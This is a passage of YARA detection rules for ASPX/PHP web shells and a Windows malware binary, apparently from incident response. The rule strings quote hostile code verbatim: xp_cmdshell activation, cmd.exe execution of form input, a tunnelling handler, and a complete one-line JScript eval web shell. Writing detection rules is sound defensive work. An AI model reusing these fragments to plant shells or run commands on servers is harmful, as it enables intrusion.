      $x3 = "<input class=\"input\" runat=\"server\" id=\"c_path\" type=\"text\" size=\"100\" value=\"c:\\windows\\system32\\cmd.exe\" />" fullword ascii
      $x4 = "<asp:ListItem Value=\"Use master dbcc addextendedproc('xp_cmdshell','xplog70.dll')\">Add xp_cmdshell</asp:ListItem>" fullword ascii
      $x5 = "td.Text = \"<a href=\\\"javascript:Bin_PostBack('urJG','\" + dt.Rows[j][\"ProcessID\"].ToString() + \"')\\\">Kill</a>\";" fullword ascii
      $x6 = "vyX.Text += \"<a href=\\\"javascript:Bin_PostBack('Bin_Regread','\" + MVVJ(rootkey) + \"')\\\">\" + rootkey + \"</a> | \";" fullword ascii
      $x7 = "<asp:ListItem Value=\"Exec master.dbo.xp_cmdshell 'net user'\">XP_cmdshell exec</asp:ListItem>" fullword ascii
      $x8 = "tc.Text = \"<a href=\\\"javascript:Bin_PostBack('Bin_Regread','\" + MVVJ(rootkey) + \"')\\\">\" + rootkey + \"</a>\";" fullword ascii
      $x9 = "protected void cmd_execute(object sender, EventArgs e)" fullword ascii
      $x10 = "<%@ Assembly Name=\"System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\" %>" fullword ascii
      $x11 = "tc.Text = \"<a href=\\\"javascript:Bin_PostBack('Bin_Regread','\" + MVVJ(cJG) + \"')\\\">Parent Key</a>\";" fullword ascii
      $x12 = "<asp:Button ID=\"btn_cmd\" CssClass=\"bt\" runat=\"server\" Text=\"Submit\" OnClick=\"cmd_execute\"" fullword ascii
      $x13 = "<asp:ListItem Value=\"sp_makewebtask @outputfile='c:\\bin.asp',@charset=gb2312,@query='select ''&lt;%execute(request(chr(35)))%&" ascii
      $x14 = "<asp:ListItem Value=\"create table [bin_cmd]([cmd] [image]);declare @a sysname,@s nvarchar(4000)select @a=db_name(),@s=0x62696E " ascii
      $x15 = "yEwc.Append(\"<li><u>Server Time : </u>\" + System.DateTime.Now.ToString() + \"</li>\");" fullword ascii
      $x16 = "<asp:ListItem Value=\"create table [bin_cmd]([cmd] [image]);declare @a sysname,@s nvarchar(4000)select @a=db_name(),@s=0x62696E " ascii
      $x17 = "uploader.PostedFile.SaveAs(FlwA + Path.GetFileName(uploader.Value));" fullword ascii
      $x18 = "<%@ Assembly Name=\"System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\" %>" fullword ascii
      $x19 = "[DllImport(\"kernel32.dll\", EntryPoint = \"GetDriveTypeA\")]" fullword ascii
      $x20 = "Bin_Button_KillMe.Attributes[\"onClick\"] = \"if(confirm('Are you sure delete ASPXSPY?')){Bin_PostBack('hae','');};\";" fullword ascii
   condition:
      ( uint16(0) == 0x253c and
        filesize < 300KB and
        ( 12 of ($x*) )
      ) or ( all of them )
}
rule WC_c {
   meta:
      description = "c.aspx"
      date = "2020-02-07"
      hash1 = "e9b5f0835854d065854d755e6839e602809bbaa8bca52ae0c38b25c8b729f986"
   strings:
      $s1 = "psi.UseShellExecute = false;" fullword ascii
      $s2 = "<form id=\"command\" method=\"post\" runat=\"server\">" fullword ascii
      $s3 = "ProcessStartInfo psi = new ProcessStartInfo();" fullword ascii
      $s4 = "Process p = Process.Start(psi);" fullword ascii
      $s5 = "<asp:Button id=\"runBtn\" runat=\"server\" Text=\"Run\" OnClick=\"btnClick\"></asp:Button>" fullword ascii
      $s6 = "psi.FileName = \"c\" + \"md\" + \".e\" + \"xe\";" fullword ascii
      $s7 = "psi.Arguments = \"/\" + \"c \" + psTxt.Text;" fullword ascii
      $s8 = "tesText.Text = \"<pre>\" + s + \"</pre>\";" fullword ascii
      $s9 = "<asp:TextBox id=\"psTxt\" runat=\"server\" Width=\"250px\"></asp:TextBox>" fullword ascii
      $s10 = "<p><asp:Label id=\"tesText\" runat=\"server\"></asp:Label>" fullword ascii
      $s11 = "void btnClick(object sender, System.EventArgs e)" fullword ascii
      $s12 = "<script Language=\"c#\" runat=\"server\">" fullword ascii
      $s13 = "psi.RedirectStandardOutput = true;" fullword ascii
      $s14 = "StreamReader stmrdr = p.StandardOutput;" fullword ascii
      $s15 = "string s = stmrdr.ReadToEnd();" fullword ascii
      $s16 = "<title>Bioethics test form</title>" fullword ascii
      $s17 = "stmrdr.Close();" fullword ascii
      $s18 = "<%@ Page Language=\"C#\" %>" fullword ascii
   condition:
      ( uint16(0) == 0x253c and
        filesize < 2KB and
        ( 10 of ($s*) )
      ) or ( all of them )
}
rule WC_wolf {
   meta:
      description = "wolf.aspx"
      date = "2020-02-07"
      hash1 = "1b707ecf25bfce80a878ce224ce4e3f1c866a670b4f7a90ed76a60cdce9ef4a0"
   strings:
      $x1 = "System.Diagnostics.ProcessStartInfo sinf = new System.Diagnostics.ProcessStartInfo(\"cmd\", \"/c \" + this.txt.Text + \"\");" fullword ascii
      $x2 = "<meta content=\"http://schemas.microsoft.com/intellisense/ie5\" name=\"vs_targetSchema\">" fullword ascii
      $x3 = "Response.Redirect(Request.ServerVariables[\"SCRIPT_NAME\"] + \"?d=\" + e.CommandArgument.ToString());" fullword ascii
      $x4 = "]----------- ThE WhitE WolF (the_white_lf_x@hotmail.com -------------------[</a>" fullword ascii
      $x5 = "** Description : Shell ASPX for All  Version Frame Work" fullword ascii
      $x6 = "<asp:Button Text=\"Execute\" OnClick=\"ADD_Click\" Runat=\"server\" ID=\"Button1\" BackColor=\"#666666\" " fullword ascii
      $x7 = "Response.AddHeader(\"Content-Disposition\", \"attachment; filename=\" + filename);" fullword ascii
      $x8 = "<asp:TemplateColumn HeaderText=\" [Download] \" HeaderStyle-Font-Size=\"10\">" fullword ascii
      $x9 = "[DllImport(\"kernel32.dll\", EntryPoint = \"GetDriveTypeA\")]" fullword ascii
      $x10 = "system0.Text = Environment.OSVersion.ToString() + \"(Windows NT 3.51)\";" fullword ascii
      $s11 = "system0.Text = Environment.OSVersion.ToString() + \"(Windows NT 4.0)\";" fullword ascii
      $s12 = "Response.Redirect(Request.ServerVariables[\"SCRIPT_NAME\"] + \"?d=\" + this.Drivers.SelectedValue);" fullword ascii
      $s13 = "Response.Redirect(Request.ServerVariables[\"SCRIPT_NAME\"] + \"?d=\" + this.txtPath.Text);" fullword ascii
      $s14 = "<asp:LinkButton ID=\"lnkExec\" runat=\"server\" onclick=\"lnkExec_Click\">[Execute " fullword ascii
      $s15 = "&nbsp;<font color=\"#00FF00\" style=\"text-align: center\"><asp:Label ID=\"lblCommand\" runat=\"server\"  " fullword ascii
      $s16 = "fileSystemRow[\"Download\"] = \"<font size=4 align=center algin=cenetre face=wingdings color=WhiteSmoke ><</font>\";" fullword ascii
      $s17 = "/*  if ((File1.PostedFile != null) && (File1.PostedFile.ContentLength > 0))" fullword ascii
      $s18 = "Response.Redirect(\"http://\"+Request.ServerVariables[\"SERVER_NAME\"]+Request.ServerVariables[\"SCRIPT_NAME\"]);" fullword ascii
      $s19 = "ASPX SheLL / Yee7 Team]-----------<font color=\"Black\"  face=\"webdings\" size=\"6\" >N</font>------------</td>" fullword ascii
      $s20 = "CommandName='<%# DataBinder.Eval(Container, \"DataItem.Download\") %>' " fullword ascii
   condition:
      ( uint16(0) == 0x4947 and
        filesize < 100KB and
        ( 5 of ($x*) and all of ($s*) )
      ) or ( all of them )
}
rule evaluatesiteupgrade_cs {
   meta:
      description = "evaluatesiteupgrade.cs.aspx"
      date = "2020-02-07"
      hash1 = "f8db380cc495e98c38a9fb505acba6574cbb18cfe5d7a2bb6807ad1633bf2df8"
   strings:
      $s1 = "<%@ Page Language=\"C#\" EnableViewState=\"false\" %> <% var Q =Request.Form[\"key\"];var D =Request.Form[\"buffer\"];if(Q!=null" ascii
   condition:
      ( uint16(0) == 0x253c and
        filesize < 2KB and
        ( all of ($s*) )
      ) or ( all of them )
}
rule EDiscovery_SourceAdderControl {
   meta:
      description = "EDiscovery.SourceAdderControl.aspx"
      date = "2020-02-07"
      hash1 = "67d72416d3ef0d5be7f901ebb6c955e1200e16ab8c8eedd28536930e6eb2ba2a"
   strings:
      $x1 = "psi.Arguments = System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String(\"L2Mg\" + arg));" fullword ascii
      $s2 = "psi.UseShellExecute = false;" fullword ascii
      $s3 = "<form id=\"cmd\" method=\"post\" runat=\"server\">" fullword ascii
      $s4 = "ProcessStartInfo psi = new ProcessStartInfo();" fullword ascii
      $s5 = "document.getElementById('txtArg').value = base64_encode;" fullword ascii
      $s6 = "Process p = Process.Start(psi);" fullword ascii
      $s7 = "document.getElementById('testing').click();" fullword ascii
      $s8 = "this.Response.ContentType = \"text/html\";" fullword ascii
      $s9 = "psi.FileName = \"cm\" + \"d.e\" + \"xe\";" fullword ascii
      $s10 = "var getText = document.getElementById('txtArg').value;" fullword ascii
      $s11 = "string authstr = auth + \"=\" + pass;" fullword ascii
      $s12 = "var base64_encode = btoa(getText);" fullword ascii
      $s13 = "string pass = \"error.cs\";" fullword ascii
      $s14 = "Response.Write(Server.HtmlEncode(cs(txtArg.Text)));" fullword ascii
      $s15 = "void ewlick(object sender, System.EventArgs e)" fullword ascii
      $s16 = "this.Response.End();" fullword ascii
      $s17 = "<script Language=\"c#\" runat=\"server\">" fullword ascii
      $s18 = "psi.RedirectStandardOutput = true;" fullword ascii
      $s19 = "<asp:Button id=\"testing\" Style=\"display: none;background: transparent; border: none !important; font-size:0;\"  runat=\"serve" ascii
      $s20 = "StreamReader stmrdr = p.StandardOutput;" fullword ascii
   condition:
      ( uint16(0) == 0x253c and
        filesize < 6KB and
        ( 1 of ($x*) and 10 of ($s*) )
      ) or ( all of them )
}
rule sticky_logos {
   meta:
      description = "sticky-logos.aspx"
      date = "2020-02-07"
      hash1 = "5f5edae2cae4db0ee988962ca2e7cccd1892e4f4b512fbb780210595c7ba7088"
   strings:
      $x1 = "<input class=\"input\" runat=\"server\" id=\"kusi\" type=\"text\" size=\"100\" value=\"c:\\windows\\system32\\cmd.exe\"/>" fullword ascii
      $s4 = "<%@ Assembly Name=\"System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\"%>" fullword ascii
      $s5 = "prcsss.StartInfo.UseShellExecute=false;" fullword ascii
      $s6 = "<%@ Assembly Name=\"Microsoft.VisualBasic,Version=7.0.3300.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a\"%>" fullword ascii
      $s7 = "<%@ import Namespace=\"System.ServiceProcess\"%>" fullword ascii
      $s8 = "<%@ Import Namespace=\"System.Data.SqlClient\"%>" fullword ascii
      $s9 = "protected void FbhN(object sender,EventArgs e)//submit cmdshell" fullword ascii
      $s10 = "<%@ import Namespace=\"System.Data.OleDb\"%>" fullword ascii
      $s11 = "Process prcsss=new Process();" fullword ascii
      $s12 = "<%@ import Namespace=\"System.Net.Sockets\" %>" fullword ascii
      $s13 = "<%@ import Namespace=\"System.Data\"%>" fullword ascii
      $s14 = "<%@ import Namespace=\"System.Text.RegularExpressions\"%>" fullword ascii
      $s15 = "<%@ import Namespace=\"System.Net\" %>" fullword ascii
      $s16 = "<%@ import Namespace=\"System.Runtime.InteropServices\"%>" fullword ascii
      $s17 = "<%@ import Namespace=\"System.DirectoryServices\"%>" fullword ascii
      $s18 = "tnQRF.InnerHtml=\"<hr width=\\\"100%\\\" noshade/><pre>\"+poutPut+\"</pre>\";" fullword ascii
      $s19 = "<div id=\"tnQRF\" runat=\"server\" visible=\"false\" enableviewstate=\"false\">" fullword ascii
      $s20 = "<%@ Import Namespace=\"System.Threading\"%>" fullword ascii
   condition:
      ( uint16(0) == 0x253c and
        filesize < 8KB and
        ( 1 of ($x*) and 8 of ($s*) )
      ) or ( all of them )
}
rule WC_svhost4 {
   meta:
      description = "svhost4.exe"
      date = "2020-02-07"
      hash1 = "5d9ca99eab1bcf2d673df9e5149140c5548c441f2bfe121244bb16f058175a04"
   strings:
      $x1 = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\svchost.exe" fullword wide
      $x2 = "C:\\\\windows\\\\temp\\sysBin.sys" fullword wide
      $s3 = "C:\\users\\" fullword wide
      $s4 = "C:\\Documents and Settings\\" fullword wide
      $s5 = "C:\\windows\\system32\\" fullword wide
      $s6 = "Gazaneh.exe" fullword wide
      $s7 = "ProcessProtection" fullword ascii
      $s8 = "C:\\Recovery\\" fullword wide
      $s9 = "C:\\inetpub\\" fullword wide
      $s10 = "C:\\ProgramData\\" fullword wide
      $s11 = ".NET Framework 4@" fullword ascii
      $s12 = "E89E4E2EDAD1B7044E0C57DC6BEDDA82B7C46E3F" fullword ascii
      $s13 = "Gazaneh.Properties.Resources.resources" fullword ascii
      $s14 = "/C shutdown /R /T 0 /F" fullword wide
      $s15 = "Gazaneh.Properties.Resources" fullword wide
      $s16 = "GetDirectores" fullword ascii
      $s17 = "Gazaneh.Properties" fullword ascii
      $s18 = "FileShareWrite" fullword ascii
      $s19 = "$d39595c2-76fa-47fb-9891-3b4f4eb9c113" fullword ascii
      $s20 = "FileShareRead" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 40KB and
        ( 1 of ($x*) and 6 of ($s*) )
      ) or ( all of them )
}
rule WC_whoami {
   meta:
      description = "whoami.bat"
      date = "2020-02-07"
      hash1 = "dc81fd5e295b1cef2be2d13a255a021bdcd76227d1b0a89e310d1fa273719a15"
   strings:
      $s1 = "FOR /F \"tokens=1* delims=.\" %%A IN ('ECHO.%minorver%') DO SET MinorVer=%%A" fullword ascii
      $s2 = "FOR /F \"tokens=1* delims=.\" %%A IN ('VER ^| FIND \".\"') DO (SET MajorVer=%%A&SET MinorVer=%%B)" fullword ascii
      $s3 = "ECHO Logon domain         :  %userdomain%" fullword ascii
      $s4 = "ECHO Minor version number :  %minorver%" fullword ascii
      $s5 = "ECHO Major version number :  %majorver%" fullword ascii
      $s6 = "ECHO User Id logged on    :  %username%" fullword ascii
      $s7 = "ECHO Computer Name        :  \\\\%computername%" fullword ascii
      $s8 = "FOR %%A IN (%majorver%) DO SET MajorVer=%%A" fullword ascii
      $s9 = "ECHO LAN Group            :  %userdomain%" fullword ascii
      $s10 = "IF ERRORLEVEL 1 GOTO:EOF" fullword ascii
      $s11 = "VER | FIND \"Windows\" >NUL" fullword ascii
      $s12 = "ECHO Other domains        :  -none-" fullword ascii
   condition:
      ( uint16(0) == 0x4540 and
        filesize < 1KB and
        ( 9 of ($s*) )
      ) or ( all of them )
}
rule a206ecfd_4136_4b70_a3c2_128ddc03cf00 {
   meta:
      description = "a206ecfd-4136-4b70-a3c2-128ddc03cf00.aspx"
      date = "2020-02-07"
      hash1 = "664893ad316f087c089c5462e532af03e1e2ea42b53fa4746c3983604fd4f747"
   strings:
      $x1 = "Call oScript.Run (\"cmd.exe /c \" & cmd_to_execute & \" > \" & tempFile, 0, True)" fullword ascii
      $x2 = "errReturn = WinExec(Target_copy_of_cmd + \" /c \" + command + \"  > \" + tempFile , 10)" fullword ascii
      $x3 = "<p> Execute command with ASP.NET account using WSH(<span class=\"style3\">Notice: only click &quot;Run&quot; to run</span>)</p>" fullword ascii
      $x4 = "<p> Execute command with ASP.NET account using W32(<span class=\"style3\">Notice: only click &quot;Run&quot; to run</span>)</p>" fullword ascii
      $x5 = "objProcessInfo = winObj.ExecQuery(\"Select \"+Fields_to_Show+\" from \" + Wmi_Function)" fullword ascii
      $x6 = "<p> Execute command with ASP.NET account(<span class=\"style3\">Notice: only click &quot;Run&quot; to run</span>)</p>" fullword ascii
      $x7 = "'local_copy_of_cmd= \"C:\\\\WINDOWS\\\\system32\\\\cmd.exe\"" fullword ascii
      $x8 = "Sub ExecuteCommand1(command As String, tempFile As String,cmdfile As String)" fullword ascii
      $x9 = "Dim kProcessStartInfo As New ProcessStartInfo(\"cmd.exe\")" fullword ascii
      $x10 = "<p> Execute command with SQLServer account(<span class=\"style3\">Notice: only click \"Run\" to run</span>)</p>" fullword ascii
      $x11 = "Declare Function WinExec Lib \"kernel32\" Alias \"WinExec\" (ByVal lpCmdLine As String, ByVal nCmdShow As Long) As Long" fullword ascii
      $x12 = "Target_copy_of_cmd = Environment.GetEnvironmentVariable(\"Temp\")+\"\\kiss.exe\"" fullword ascii
      $x13 = "System.Web.Mail.SmtpMail.Send(request.ServerVariables(\"HTTP_HOST\"),\"test.mail.address.2008@gmail.com\",request.ServerVariable" ascii
      $x14 = "Function ExecuteCommand2(cmd_to_execute, tempFile)" fullword ascii
      $x15 = "ExecuteCommand1(command,tempFile,txtCmdFile.Text)" fullword ascii
      $x16 = "<asp:TextBox ID=\"txtCmdFile\" runat=\"server\" Width=\"473px\" style=\"border: 1px solid #084B8E\">C:\\\\WINDOWS\\\\system32" ascii
      $x17 = "kProcessStartInfo.UseShellExecute = False" fullword ascii
      $x18 = "Dim winObj, objProcessInfo, item, local_dir, local_copy_of_cmd, Target_copy_of_cmd" fullword ascii
      $x19 = "ExecuteCommand2(command,tempFile)" fullword ascii
      $x20 = "<td><a href=\"?action=user\" >List User Accounts</a> - <a href=\"?action=auser\" >IIS Anonymous User</a>- <a href=\"?action=scan" ascii
   condition:
      ( uint16(0) == 0x253c and
        filesize < 200KB and
        ( 12 of ($x*) )
      ) or ( all of them )
}
rule guide_icons {
   meta:
      description = "guide-icons.aspx"
      date = "2020-02-07"
      hash1 = "31f208591cfc432756faa2e8683f00a13f7870fdd3a5f6ed61507299e897afe5"
   strings:
      $x1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"FGEy\" AutoPostBack=\"True\" OnSelectedIndexChanged=\"zOVO\" CssClass=\"list\"" ascii
      $x2 = "td.Text=\"<a href=\\\"javascript:Bin_PostBack('KillProcess','\"+dt.Rows[j][\"ProcessID\"].ToString()+\"')\\\">Kill</a>\";" fullword ascii
      $x3 = "Response.AddHeader(\"Content-Disposition\",\"attachment;filename=\"+HttpUtility.UrlEncode(fs.Name,System.Text.Encoding.UTF8));" fullword ascii
      $x4 = "using (SqlDataReader reader = KOleDbCommand.ExecuteReader())" fullword ascii
      $x5 = "vyX.Text+=\"<a href=\\\"javascript:Bin_PostBack('Bin_Regread','\"+MVVJ(rootkey)+\"')\\\">\"+rootkey+\"</a> | \";" fullword ascii
      $x6 = "<%@ Assembly Name=\"System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\"%>" fullword ascii
      $x7 = "Response.AppendHeader(\"Content-Disposition\", \"attachment;filename=\" + s + \".csv\");" fullword ascii
      $x8 = "Copyright &copy; 2009 Bin -- <a href=\"xxx\" target=\"_blank\">xxx</a>" fullword ascii
      $x9 = "tc.Text=\"<a href=\\\"javascript:Bin_PostBack('Bin_Regread','\"+MVVJ(Reg_Path+innerSubKey)+\"')\\\">\"+innerSubKey+\"</a>\";" fullword ascii
      $x10 = "<%@ Assembly Name=\"System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\"%>" fullword ascii
      $x11 = "[DllImport(\"kernel32.dll\",EntryPoint=\"GetDriveTypeA\")]" fullword ascii
      $x12 = "foreach(ManagementObject p in PhQTd(\"Select * from Win32_Process Where ProcessID ='\"+pid+\"'\"))" fullword ascii
      $x13 = "tc.Text=\"<a href=\\\"javascript:Bin_PostBack('Bin_Regread','\"+MVVJ(rootkey)+\"')\\\">\"+rootkey+\"</a>\";" fullword ascii
      $s14 = "ServiceController[] kQmRu=System.ServiceProcess.ServiceController.GetServices();" fullword ascii
      $s15 = "nxeDR.Command+=new CommandEventHandler(this.iVk);" fullword ascii
      $s16 = "<%@ Assembly Name=\"System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\"%>" fullword ascii
      $s17 = "DataTable dbs = CYUeInDump(@\"SELECT name FROM master.dbo.sysdatabases\");" fullword ascii
      $s18 = "tc.Text=\"<a href=\\\"javascript:Bin_PostBack('Bin_Regread','\"+MVVJ(cJG)+\"')\\\">Parent Key</a>\";" fullword ascii
      $s19 = "<asp:ListItem Value=\"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\\database.mdb\">ACCESS</asp:ListItem></asp:DropDownList>" fullword ascii
      $s20 = "<div id=\"passwordContainer\" runat=\"server\" style=\" margin:15px\" enableviewstate=\"false\" visible=\"false\" >" fullword ascii
   condition:
      ( uint16(0) == 0x253c and
        filesize < 200KB and
        ( 8 of ($x*) and all of ($s*) )
      ) or ( all of them )
}
rule WC_tunnel {
   meta:
      description = "tunnel.ashx"
      date = "2020-02-07"
      hash1 = "b074b8e5c16eb6d24eba16de615e6e17709ac6fb69cdf576c29eba3072e90093"
   strings:
      $s1 = "public void ProcessRequest (HttpContext context) {" fullword ascii
      $s2 = "System.Net.IPEndPoint remoteEP = new IPEndPoint(ip, port);" fullword ascii
      $s3 = "public class GenericHandler1 : IHttpHandler, System.Web.SessionState.IRequiresSessionState" fullword ascii
      $s4 = "String target = context.Request.Headers.GetValues(\"X-TARGET\")[0].ToUpper();" fullword ascii
      $s5 = "String cmd = context.Request.Headers.GetValues(\"X-CMD\")[0].ToUpper();" fullword ascii
      $s6 = "IPAddress ip = IPAddress.Parse(target);" fullword ascii
      $s7 = "Socket sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);" fullword ascii
      $s8 = "context.Response.AddHeader(\"X-ERROR\", exKak.Message);" fullword ascii
      $s9 = "context.Response.AddHeader(\"X-STATUS\", \"FAIL\");" fullword ascii
      $s10 = "context.Response.AddHeader(\"X-ERROR\", ex.Message);" fullword ascii
      $s11 = "int port = int.Parse(context.Request.Headers.GetValues(\"X-PORT\")[0]);" fullword ascii
      $s12 = "context.Session.Add(socketID+\"socket\", sender);" fullword ascii
      $s13 = "int bufSize = int.Parse(context.Request.Headers.GetValues(\"Bufsize\")[0]);" fullword ascii
      $s14 = "context.Session.Add(\"socket\", sender);" fullword ascii
      $s15 = "context.Response.AddHeader(\"X-STATUS\", \"OK\");" fullword ascii
      $s16 = "if (context.Request.HttpMethod == \"POST\")" fullword ascii
      $s17 = "else if (cmd == \"FORWARD\")" fullword ascii
      $s18 = "while ((c = context.Request.InputStream.Read(buff, 0, buff.Length)) > 0)" fullword ascii
      $s19 = "Array.ConstrainedCopy(readBuff, 0, newBuff, 0, c);" fullword ascii
      $s20 = "else if (cmd == \"READ\")" fullword ascii
   condition:
      ( uint16(0) == 0x253c and
        filesize < 20KB and
        ( 10 of ($s*) )
      ) or ( all of them )
}
rule diagnostics6 {
   meta:
      description = "diagnostics6.aspx"
      date = "2020-02-07"
      hash1 = "98dbf1e679ceb96e7ea5ebdc7a26cd689e87a6f5548305d55bc8ba2acadbc88b"
   strings:
      $x1 = "System.IO.File.Copy(Request.QueryString[\"copy\"], @\"E:\\s\\s\\uploads\\forms\\\" + Request.QueryString[\"filename\"], true);" fullword ascii
      $s2 = "lblCmdOut.Text = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();" fullword ascii
      $s3 = "p.StartInfo.FileName = \"cmd.exe\";" fullword ascii
      $s4 = "<asp:Button runat=\"server\" ID=\"cmdExec\" Text=\"Execute\" />" fullword ascii
      $s5 = "string fstr = string.Format(\"<a href='?get={0}&{2}' target='_blank'>{1}</a>\"," fullword ascii
      $s6 = "p.StartInfo.UseShellExecute = false;" fullword ascii
      $s7 = "<asp:Label ID=\"lblFileNameForDateChange\" Text=\"File Name For Date Change e.g. (D:\\FileDate.txt)\" runat=\"server\"></asp:Lab" ascii
      $s8 = "HttpUtility.UrlEncode(dir + \"/\" + curfile.Name)," fullword ascii
      $s9 = "HttpUtility.UrlEncode(dir + \"/\" + curdir.Name)," fullword ascii
      $s10 = "<asp:Button runat=\"server\" ID=\"cmdUpload\" Text=\"Upload\" />" fullword ascii
      $s11 = "if ((Request.QueryString[\"get\"] != null) && (Request.QueryString[\"get\"].Length > 0))" fullword ascii
      $s12 = "HttpUtility.HtmlEncode(driveRoot)," fullword ascii
      $s13 = "HttpUtility.UrlEncode(driveRoot)," fullword ascii
      $s14 = "<%@ Import Namespace=\"System.Web.UI.WebControls\" %>" fullword ascii
      $s15 = "<pre><asp:Literal runat=\"server\" ID=\"lblCmdOut\" Mode=\"Encode\" /></pre>" fullword ascii
      $s16 = "<asp:Literal runat=\"server\" ID=\"lblPath\" Mode=\"passThrough\" /></b>" fullword ascii
      $s17 = "string driveRoot = curdrive.RootDirectory.Name.Replace(\"\\\\\", \"\");" fullword ascii
      $s18 = "Response.WriteFile(Request.QueryString[\"get\"]);" fullword ascii
      $s19 = "<asp:TextBox Width=\"300\" ID=\"txtFileNameForDateChange\" runat=\"server\"></asp:TextBox>" fullword ascii
      $s20 = "Process p = new Process();" fullword ascii
   condition:
      ( uint16(0) == 0x253c and
        filesize < 40KB and
        ( 1 of ($x*) and 10 of ($s*) )
      ) or ( all of them )
}
rule WC__php {
   meta:
      description = ".php"
      date = "2020-02-07"
      hash1 = "b5aa65e892674d9add714cf44440c3e248d269fa66346714d3704cd53e5612f9"
   strings:
      $s1 = "'SnZlSGxmZG1GeWFXRmliR1Z6S1NsN0lDUmpkWEp5WDNWeWJDNDlLSE4wY25CdmN5Z2tZM1Z5Y2w5'." fullword ascii
      $s2 = "'amFHRnlQakV5TmlrZ0pHTm9ZWEl0UFRrME93MEtDUWtrYm1WM1gzVnliQzQ5WTJoeUtDUmphR0Z5'." fullword ascii
      $s3 = "'VnliRDFtWVd4elpTd2tZV1JrY0hKdmVIazlkSEoxWlNsN0RRb0paMnh2WW1Gc0lDUmpkWEp5WDNW'." fullword ascii
      $s4 = "'Lg0KIkxYZCtXV0VITFVkL1RvSkZaUU9PajVDUmppQ0JsWmFYSUJFQU93PT0iLA0KImV4dF9hc3Ai'." fullword ascii
      $s5 = "'UVZSUFVqc05DZ2tKQ1dsbUtITjFZbk4wY2lna1kyOXZhMTl3Y21WbWFYZ3NjM1J5YkdWdUtDUmpi'." fullword ascii
      $s6 = "'bXM5Wm5KbFlXUW9KR1p3TERneE9USXBPdzBLQ1FrSkNXbG1LR1Z0Y0hSNUtDUmphSFZ1YXlrcElH'." fullword ascii
      $s7 = "'OUxYMUJTUlVZbkxDUmpiMjlyY0hKbFppazdEUXBrWldacGJtVW9KME5QVDB0SlJWOVRSVkJCVWtG'." fullword ascii
      $s8 = "'WDFCU1JVWXBMREVwS1RzTkNna0pDWGRvYVd4bEtDUmphR0Z5UERNeUtTQWtZMmhoY2lzOU9UUTdE'." fullword ascii
      $s9 = "'SnlaV0ZyT3cwS0NRa0pDV2xtS0NScWRYTjBiM1YwY0hWMGJtOTNLU0JsWTJodklDUmphSFZ1YXpz'." fullword ascii
      $s10 = "'YkpHbGRXeVJxWFNrN0RRb0pDUWtKQ1FrSmFXWW9jM1ZpYzNSeUtDUmpiMlJsTERBc01URXBQVDBu'." fullword ascii
      $s11 = "'SEJoY25SdmNHRnljMlZkV3pCZExDUmpkWEp5WDNWeWJHOWlhaXdrWVdSa2NISnZlSGtwT3cwS0NR'." fullword ascii
      $s12 = "'UVVkRklGSkZWRkpKUlZaQlRDQjdlM3NOQ2cwS0pIQmhaMlZ6ZEhWbVpqMW5aWFJ3WVdkbEtDUmpk'." fullword ascii
      $s13 = "'Z2MyVjBZMjl2YTJsbEtDUmpiMjlyYm1GdFpTd2tZMjl2YTNaaGJDazdEUW9KWld4elpTQnpaWFJq'." fullword ascii
      $s14 = "'Skd0bGVTa3RjM1J5YkdWdUtDUmpiMjlyWDJSdmJXRnBiaWtwT3cwS0NRa0phV1lvSVdsdVgyRnlj'." fullword ascii
      $s15 = "'SmRtRnNQWFJvYVhNdVkzVnljbDkxY214dlltb3VaMlYwWDNWeWJDZ3BPdzBLQ1FsaGRIUnlQU0pv'." fullword ascii
      $s16 = "'bUZ0WlNnaWRISWlLVHNOQ2dsbWIzSW9kbUZ5SUdrOU1UdHBQRDB4TWp0cEt5c3BJR0ZrZG1GdVky'." fullword ascii
      $s17 = "'NDllRzFzYUhSMGNHOWlhaTV2Y0dWdU93MEtDWGh0YkdoMGRIQnZZbW91YjNCbGJqMDhQM0JvY0NC'." fullword ascii
      $s18 = "'VXdBdlluVnBiR1F2WW5WcGJHUmtMMmRzYVdKakxUSXVNeTQyTDJKMWFXeGtMWFJ5WldVdloyeHBZ'." fullword ascii
      $s19 = "'amF5Z2tZV1JrY21WemN5bDdEUW9KWjJ4dlltRnNJQ1JpYkc5amEyVmtYMkZrWkhKbGMzTmxjenNO'." fullword ascii
      $s20 = "'NC92Ly8vL3YrLzNlejZ2ZjcvL1Q1L2tHUzRQdjkvN1hWK3JIVCtyL2IrcnphK3ZQNCIuDQoiL3V6'." fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
        filesize < 1000KB and
        ( 12 of ($s*) )
      ) or ( all of them )
}
rule WC_Layout1 {
   meta:
      description = "Layout1.aspx"
      date = "2020-02-07"
      hash1 = "596b2a90c1590eaf704295a2d95aae5d2fec136e9613e059fd37de4b02fd03bb"
   strings:
      $s1 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Form[\"content\"],\"unsafe\");%>" fullword ascii
   condition:
      ( uint16(0) == 0x253c and
        filesize < 1KB and
        ( all of ($s*) )
      ) or ( all of them )
}
rule WC_Footer {
   meta:
      description = "Footer.aspx"
      date = "2020-02-07"
      hash1 = "f4639c63fb01875946a4272c3515f005d558823311d0ee4c34896c2b66122596"
   strings:
      $x1 = "catch (Exception ex) { WriteError(ex.ToString(), ErrorPlaces.GENERAL, GetParam(DllKey) as EncryptionModule); }" fullword ascii
      $x2 = "PackageManager Package = new PackageManager(Request.BinaryRead(Request.TotalBytes), EncryptionDll);" fullword ascii
      $x3 = "WriteError(\"Invalid Config Package.\", ErrorPlaces.OnConfig, EncryptionDll);" fullword ascii
